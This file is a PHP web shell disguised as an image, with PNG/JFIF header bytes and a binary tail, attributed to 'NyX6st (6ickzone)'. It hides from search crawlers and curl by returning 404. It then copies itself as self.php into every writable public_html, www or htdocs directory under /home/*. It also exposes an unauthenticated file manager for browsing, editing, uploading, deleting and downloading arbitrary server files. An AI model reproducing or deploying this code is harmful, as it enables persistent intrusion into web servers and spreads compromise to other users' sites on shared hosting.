�PNG
�JFIF������
<?php
error_reporting(0);

/* Simple + Bypass + Copy — NyX6st (6ickzone) — https://0x6ick.my.id
 * Version: 1.0.0
 * SPDX-License-Identifier: WTFPL
 *
 * "You just DO WHAT THE FUCK YOU WANT TO."
 * Respect the author.
 */
error_reporting(0);  
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
    if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
// === Configuration ===  
function findAllWebRoots($userRoot = "/home/*") {

    $candidates = ['public_html', 'public', 'www', 'htdocs'];

    $roots = [];
    foreach (glob($userRoot, GLOB_ONLYDIR) as $home) {
        foreach ($candidates as $folder) {
            $path = "$home/$folder";
            if (is_dir($path)) {
                $roots[] = $path;
            }
        }
    }
    return $roots;
}

function deployMulti($sourceFile, $targetName) {
    $targets = [];
    $roots = findAllWebRoots();

    foreach ($roots as $htmlPath) {
        if (is_writable($htmlPath)) {
            $targetPath = "$htmlPath/$targetName";
            if (@copy($sourceFile, $targetPath)) {
                $domain = basename(dirname($htmlPath));
                $targets[] = "$htmlPath/$targetName"; //change
            }
        }
    }
    return $targets;
}

$self = __FILE__;
$urls = deployMulti($self, "self.php");
print_r($urls);



$cwd = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$cwd || !is_dir($cwd)) $cwd = getcwd();

if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $item = $cwd . '/' . basename($_GET['item']);
    
    if ($action === 'delete' && file_exists($item)) {
        if (is_dir($item)) {
            if (count(scandir($item)) == 2) { // Cek
                rmdir($item);
            } else {
                echo "<p style='color:#f66'>❌ Gagal: Folder tidak kosong.</p>";
            }
        } else {
            unlink($item);
        }
        header("Location: ?path=" . urlencode($cwd));
        exit;
    }
    
    if ($action === 'rename' && file_exists($item) && isset($_POST['new_name'])) {
        $newName = $cwd . '/' . basename($_POST['new_name']);
        rename($item, $newName);
        header("Location: ?path=" . urlencode($cwd));
        exit;
    }

    if ($action === 'download' && is_file($item)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($item) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($item));
        readfile($item);
        exit;
    }
}

if (!empty($_FILES['upload']['name'])) {
    $target = $cwd . '/' . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $target);
    echo "<p style='color:#0f0'>📤 Berhasil Unggah: " . htmlspecialchars($_FILES['upload']['name']) . "</p>";
}
if (!empty($_POST['newdir'])) {
    $newFolder = $cwd . '/' . basename($_POST['newdir']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder);
        echo "<p style='color:#0f0'>📁 Folder berhasil dibuat</p>";
    } else {
        echo "<p style='color:#f66'>❌ Gagal: Folder sudah ada.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
    body { 
        background: #0d0d0d; 
        color: #f1f1f1; 
        font-family: 'Courier New', monospace; 
        padding: 20px; 
    }

    a { 
        color: #00fff7; 
        text-decoration: none; 
        transition: all 0.3s; 
        text-shadow: 0 0 5px #00fff7;
    }
    a:hover { 
        color: #ff00ff; 
        text-shadow: 0 0 8px #ff00ff, 0 0 15px #ff00ff;
    }

    textarea, input[type=text] { 
        width: 100%; 
        font-family: monospace; 
        background: #111; 
        color: #0ff; 
        border: 1px solid #00fff7; 
        padding: 10px; 
        box-sizing: border-box; 
        border-radius: 5px; 
        margin-bottom: 10px; 
        text-shadow: 0 0 5px #0ff;
    }

    input[type=submit] { 
        background: #00fff7; 
        color: #000; 
        border: none; 
        padding: 10px 15px; 
        border-radius: 5px; 
        cursor: pointer; 
        font-weight: bold; 
        text-transform: uppercase;
        transition: all 0.3s; 
        box-shadow: 0 0 10px #00fff7;
    }
    input[type=submit]:hover { 
        background: #ff00ff; 
        color: #fff; 
        box-shadow: 0 0 15px #ff00ff, 0 0 25px #ff00ff;
    }

    .file-manager-container { 
        display: flex; 
        flex-direction: column; 
        gap: 15px; 
    }

    table { 
        width: 100%; 
        border-collapse: collapse; 
    }
    th, td { 
        padding: 12px; 
        text-align: left; 
        border-bottom: 1px solid #222; 
    }
    th { 
        background-color: #111; 
        font-weight: bold; 
        color: #0ff; 
        text-shadow: 0 0 5px #0ff;
    }
    tr:hover { 
        background-color: #1a1a1a; 
    }

    .actions a { 
        margin-right: 10px; 
    }
    .actions a.delete { 
        color: #ff0040; 
        text-shadow: 0 0 5px #ff0040;
    }
    .actions a.delete:hover { 
        color: #ff0000; 
        text-shadow: 0 0 10px #ff0000; 
    }
    .actions a.download { 
        color: #00ff90; 
        text-shadow: 0 0 5px #00ff90;
    }
    .actions a.download:hover { 
        color: #00ffaa; 
        text-shadow: 0 0 10px #00ffaa; 
    }
</style>
</head>
<body>

    <h2>🗂️ File Manager</h2>
    <p><b>Path:</b> 
    <?php
    $parts = explode('/', trim($cwd, '/'));
    $build = '/';
    foreach ($parts as $part) {
        $build .= "$part/";
        echo "<a href='?password=$password&path=" . urlencode($build) . "'>$part</a>/";
    }
    echo "</p><hr>";

    // --- File Editor ---
    if (isset($_GET['edit'])) {
        $file = realpath($cwd . '/' . basename($_GET['edit']));
        if (is_file($file)) {
            if (isset($_POST['content'])) {
                file_put_contents($file, $_POST['content']);
                echo "<p style='color:#0f0'>✅ Disimpan</p>";
            }
            $code = htmlspecialchars(file_get_contents($file));
            echo "<h3>✏️ Mengedit: " . basename($file) . "</h3> 
            <form method='post'> 
                <textarea name='content' rows='20'>$code</textarea><br> 
                <input type='submit' value='Simpan'> 
            </form> 
            <p><a href='?password=$password&path=" . urlencode($cwd) . "'>🔙 Kembali</a></p>";
            exit;
        }
    }

    ?>
    <div class="file-manager-container">
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Perms</th>
                    <th>Date</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <?php
                foreach (scandir($cwd) as $item) {
                    if ($item === '.') continue;
                    $full = $cwd . '/' . $item;
                    $encodedPath = urlencode($cwd);
                    
                    if (is_dir($full)) {
                        echo "<tr>";
                        echo "<td data-label='Nama'>📁 <a href='?password=$password&path=" . urlencode($full) . "'>" . htmlspecialchars($item) . "</a></td>";
                        echo "<td data-label='Ukuran'>-</td>";
                        echo "<td data-label='Izin'>" . substr(sprintf('%o', fileperms($full)), -4) . "</td>";
                        echo "<td data-label='Dimodifikasi'>" . date("Y-m-d H:i", filemtime($full)) . "</td>";
                        echo "<td data-label='Aksi' class='actions'>";
                        echo "<a href='?password=$password&path=$encodedPath&action=delete&item=" . urlencode($item) . "' class='delete' onclick='return confirm(\"Yakin hapus folder ini?\")'>[Hapus]</a>";
                        echo "</td>";
                        echo "</tr>";
                    } else {
                        echo "<tr>";
                        echo "<td data-label='Nama'>📄 <a href='?password=$password&path=$encodedPath&edit=" . urlencode($item) . "'>" . htmlspecialchars($item) . "</a></td>";
                        echo "<td data-label='Ukuran'>" . round(filesize($full) / 1024, 2) . " KB</td>";
                        echo "<td data-label='Izin'>" . substr(sprintf('%o', fileperms($full)), -4) . "</td>";
                        echo "<td data-label='Dimodifikasi'>" . date("Y-m-d H:i", filemtime($full)) . "</td>";
                        echo "<td data-label='Aksi' class='actions'>";
                        echo "<a href='?password=$password&path=$encodedPath&edit=" . urlencode($item) . "'>[Edit]</a>";
                        echo "<a href='?password=$password&path=$encodedPath&action=download&item=" . urlencode($item) . "' class='download'>[Unduh]</a>";
                        echo "<form id='renameForm_$item' method='post' action='?password=$password&path=$encodedPath&action=rename&item=" . urlencode($item) . "' style='display:none'>
        <input type='hidden' name='new_name' id='newName_$item'>
      </form>
      <a href='#' onclick='let newName = prompt(\"Ganti nama:\", \"$item\"); 
      if(newName){ document.getElementById(\"newName_$item\").value=newName; document.getElementById(\"renameForm_$item\").submit(); }'>[Rename]</a>";
                        echo "<a href='?password=$password&path=$encodedPath&action=delete&item=" . urlencode($item) . "' class='delete' onclick='return confirm(\"Yakin hapus file ini?\")'>[Hapus]</a>";
                        echo "</td>";
                        echo "</tr>";
                    }
                }
                ?>
            </tbody>
        </table>
    </div>

    <hr>
    
    <div style="display:flex; gap: 20px; flex-wrap: wrap;">
        <div style="flex:1;">
            <form method='post' enctype='multipart/form-data'>
                <label> Upload File:</label><br>
                <input type='file' name='upload'><br>
                <input type='hidden' name='password' value='<?php echo htmlspecialchars($password); ?>'>
                <input type='submit' value='Unggah'>
            </form>
        </div>
        <div style="flex:1;">
            <form method='post'>
                <label> make folder:</label><br>
                <input type='text' name='newdir'><br>
                <input type='hidden' name='password' value='<?php echo htmlspecialchars($password); ?>'>
                <input type='submit' value='Buat'>
            </form>
        </div>
    </div>
</body>
</html>
<!-- image binary tail -->
����nTJnLK��@!�-����m�
